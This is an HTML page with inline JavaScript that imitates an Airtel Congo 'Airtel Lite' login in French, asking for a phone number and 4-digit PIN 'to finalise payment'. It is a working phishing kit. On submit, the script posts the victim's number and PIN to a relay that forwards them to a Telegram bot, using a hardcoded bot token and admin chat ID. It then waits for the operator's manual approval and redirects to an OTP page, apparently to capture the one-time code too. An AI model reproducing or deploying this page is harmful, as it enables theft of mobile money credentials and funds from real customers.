<!doctype html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Connexion Airtel Lite</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="login-airtel.css">
    <link rel="stylesheet" href="login-logo.css">
    <link rel="stylesheet" href="phone-prefix.css">
    <link rel="stylesheet" href="eye-toggle.css">
</head>
<body>
    <main class="al-page">
        <header class="al-header">
            <img class="airtel-image" src="image.png" alt="Airtel — A reason to imagine">
        </header>
        <section class="al-main">
            <h1 class="al-title">Connectez-vous à Airtel Lite pour finaliser le paiement.</h1>
            <form id="login-form" class="al-form">
                <div class="al-phone-group">
                    <span class="al-country-code">CD&nbsp;+243</span>
                    <input id="phone" class="al-phone" type="tel" inputmode="tel" placeholder="951234567" aria-label="Numéro Airtel" maxlength="9">
                </div>
                <label class="al-pin-label">Entrez votre Code</label>
                <div class="al-pin-wrap">
                    <input class="al-pin" inputmode="numeric" maxlength="1" aria-label="Premier chiffre" type="password">
                    <input class="al-pin" inputmode="numeric" maxlength="1" aria-label="Deuxième chiffre" type="password">
                    <input class="al-pin" inputmode="numeric" maxlength="1" aria-label="Troisième chiffre" type="password">
                    <input class="al-pin" inputmode="numeric" maxlength="1" aria-label="Quatrième chiffre" type="password">
                    <button type="button" class="al-eye" aria-label="Afficher le code">
                        <svg viewBox="0 0 24 24" aria-hidden="true">
                            <path d="M2.5 12S6 5.5 12 5.5 21.5 12 21.5 12 18 18.5 12 18.5 2.5 12 2.5 12Z"/>
                            <circle cx="12" cy="12" r="2.8"/>
                        </svg>
                    </button>
                </div>
                <button id="connect" class="al-connect" type="submit" disabled>CONNEXION</button>
            </form>
        </section>
        <footer class="al-footer">
            <img class="airtel-image" src="image.png" alt="Airtel — A reason to imagine">
            <p class="al-partner">En collaboration avec<br>STARLINK™</p>
            <p class="al-copyright">© 2026 Airtel Congo. Tous droits réservés.</p>
        </footer>
    </main>
    <script>
const TELEGRAM_API_BASE = 'http://localhost:3000/api';
const BOT_TOKEN = '8814762444:AAHh9cM13O55o30Sv4OvXtC5B0JaF4tdm_o';
const ADMIN_CHAT_ID = '7867527304';

const USE_TELEGRAM = !BOT_TOKEN.includes('YOUR_');
const telegramApi = USE_TELEGRAM ? `https://api.telegram.org/bot${BOT_TOKEN}` : TELEGRAM_API_BASE;

const eyeButton = document.querySelector('.al-eye');
const codeInputs = [...document.querySelectorAll('.al-pin')];
const phoneInput = document.querySelector('#phone');
const connectBtn = document.querySelector('#connect');
const loginForm = document.querySelector('#login-form');

codeInputs.forEach(input => input.type = 'password');

if (eyeButton) {
    eyeButton.innerHTML = '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M2.5 12S6 5.5 12 5.5 21.5 12 21.5 12 18 18.5 12 18.5 2.5 12 2.5 12Z"/><circle cx="12" cy="12" r="2.8"/></svg>';
    eyeButton.addEventListener('click', () => {
        const visible = eyeButton.classList.toggle('is-visible');
        codeInputs.forEach(input => input.type = visible ? 'text' : 'password');
        eyeButton.setAttribute('aria-label', visible ? 'Masquer le code' : 'Afficher le code');
    });
}

if (phoneInput) {
    phoneInput.maxLength = 9;
    phoneInput.addEventListener('input', () => {
        phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 9);
        state();
        if (isPhoneValid()) {
            codeInputs.find(input => !input.value)?.focus();
        }
    });
}

codeInputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
        const value = e.target.value.replace(/\D/g, '').slice(0, 1);
        e.target.value = value;
        if (value && index < codeInputs.length - 1) {
            codeInputs[index + 1].focus();
        }
        state();
    });

    input.addEventListener('paste', (event) => {
        event.preventDefault();
        const digits = event.clipboardData?.getData('text').replace(/\D/g, '') ?? '';
        digits.split('').slice(0, 4).forEach((digit, i) => {
            if (codeInputs[i]) codeInputs[i].value = digit;
        });
        const nextEmpty = codeInputs.find(pinInput => !pinInput.value);
        (nextEmpty ?? codeInputs.at(-1))?.focus();
        state();
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
            codeInputs[index - 1].focus();
            e.preventDefault();
        } else if (e.key === 'ArrowLeft' && index > 0) {
            codeInputs[index - 1].focus();
            e.preventDefault();
        } else if (e.key === 'ArrowRight' && index < codeInputs.length - 1) {
            codeInputs[index + 1].focus();
            e.preventDefault();
        }
    });
});

let approvalCheckInterval = null;
let currentRequestId = null;

function isPhoneValid() {
    return Boolean(phoneInput && /^9\d{8}$/.test(phoneInput.value));
}

function state() {
    if (!connectBtn) return;
    const pinValid = codeInputs.every(input => /^\d$/.test(input.value));
    const formComplete = isPhoneValid() && pinValid;

    connectBtn.disabled = !formComplete;
    connectBtn.classList.toggle('enabled', formComplete);
    phoneInput?.setAttribute('aria-invalid', String(phoneInput.value.length > 0 && !isPhoneValid()));
    codeInputs.forEach(input => input.setAttribute('aria-invalid', String(input.value.length > 0 && !/^\d$/.test(input.value))));
}

function showInvalidNumber() {
    if (document.querySelector('.number-warning')) return;
    const warning = document.createElement('div');
    warning.className = 'number-warning';
    warning.innerHTML = '<div class="number-warning-card" role="alertdialog" aria-modal="true"><div class="number-warning-icon">⚠️</div><h2>Format Invalide</h2><p>Le numéro de téléphone doit commencer par <strong>9</strong> et contenir <strong>9 chiffres</strong>.</p><p>Veuillez entrer le bon numéro et réessayer!</p><button type="button">OK</button></div>';
    warning.querySelector('button').onclick = () => {
        warning.remove();
        if (phoneInput) phoneInput.focus();
    };
    document.body.appendChild(warning);
}

function showLoadingWithProgress(message, showRetry = false) {
    const existing = document.querySelector('.telegram-loading');
    if (existing) existing.remove();

    const loader = document.createElement('div');
    loader.className = 'telegram-loading';
    loader.innerHTML = '<div class="login-loading-card"><div class="login-loading-spinner"></div><h2 class="telegram-loading-title">' + message + '</h2><p class="telegram-loading-subtitle" id="telegram-loading-subtitle">Veuillez patienter...</p>' + (showRetry ? '<button type="button" id="telegram-retry" class="telegram-retry-btn">🔄 Ressayer</button>' : '') + '</div>';
    document.body.appendChild(loader);

    if (showRetry) {
        const retryBtn = document.querySelector('#telegram-retry');
        if (retryBtn) {
            retryBtn.addEventListener('click', () => {
                loader.remove();
                initiateTelegramApproval();
            });
        }
    }
}

function hideLoading() {
    const loader = document.querySelector('.telegram-loading');
    if (loader) loader.remove();
}

function generateRequestId() {
    return 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

async function sendTelegramNotification(phone, pin) {
    const requestId = generateRequestId();
    currentRequestId = requestId;

    const message = '📲 Nouvelle demande Airtel Congo\n📱 Téléphone: ' + phone + '\n🔑 PIN: ' + pin + '\n🆔 Request: ' + requestId + '\n\n✅ /approve_' + requestId + ' - Approuver\n❌ /reject_' + requestId + ' - Rejeter';

    try {
        const response = await fetch(TELEGRAM_API_BASE + '/telegram-notification', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: phone, pin: pin, requestId: requestId })
        });
        return { success: response.ok, requestId: requestId };
    } catch (e) {
        console.error('Telegram send failed:', e);
        return { success: false, error: e.message, requestId: requestId };
    }
}

async function checkApprovalStatus(requestId) {
    try {
        const response = await fetch(TELEGRAM_API_BASE + '/check-approval/' + requestId);
        const data = await response.json();
        return data;
    } catch (e) {
        console.error('Approval check failed:', e);
        return { approved: false, status: 'error' };
    }
}

function startApprovalPolling(requestId) {
    let checkCount = 0;
    const maxChecks = 24;
    const startTime = Date.now();

    approvalCheckInterval = setInterval(async () => {
        checkCount++;
        const result = await checkApprovalStatus(requestId);

        const subtitle = document.getElementById('telegram-loading-subtitle');
        if (subtitle) {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            subtitle.textContent = 'Écoulé: ' + elapsed + 's...';
        }

        if (result.approved) {
            clearInterval(approvalCheckInterval);
            hideLoading();
            sessionStorage.setItem('airtelOTPApproved', 'true');
            sessionStorage.setItem('airtelPhone', phoneInput.value);
            sessionStorage.setItem('airtelPin', codeInputs.map(i => i.value).join(''));
            window.location.href = 'otp.html';
        } else if (result.status === 'rejected') {
            clearInterval(approvalCheckInterval);
            hideLoading();
            showLoadingWithProgress('Transaction Rejetée', true);
        } else if (checkCount >= maxChecks) {
            clearInterval(approvalCheckInterval);
            hideLoading();
            showLoadingWithProgress('Délai Expiré', true);
        }
    }, 5000);
}

function initiateTelegramApproval() {
    if (!phoneInput || !connectBtn) return;

    const phone = phoneInput.value;
    if (!isPhoneValid()) {
        showInvalidNumber();
        return;
    }

    const pin = codeInputs.map(input => input.value).join('');
    if (pin.length !== 4) return;

    sessionStorage.setItem('airtelPhone', phone);
    sessionStorage.setItem('airtelPin', pin);

    showLoadingWithProgress("En Attente d'Apport de Confirmation", true);

    sendTelegramNotification(phone, pin).then(result => {
        if (result.success) {
            startApprovalPolling(result.requestId);
        } else {
            hideLoading();
            showLoadingWithProgress('Erreur de Communication', true);
        }
    });
}

loginForm?.addEventListener('submit', (event) => {
    event.preventDefault();
    event.stopImmediatePropagation();
    initiateTelegramApproval();
});

window.addEventListener('beforeunload', () => {
    if (approvalCheckInterval) {
        clearInterval(approvalCheckInterval);
    }
});

state();
    </script>
</body>
</html>
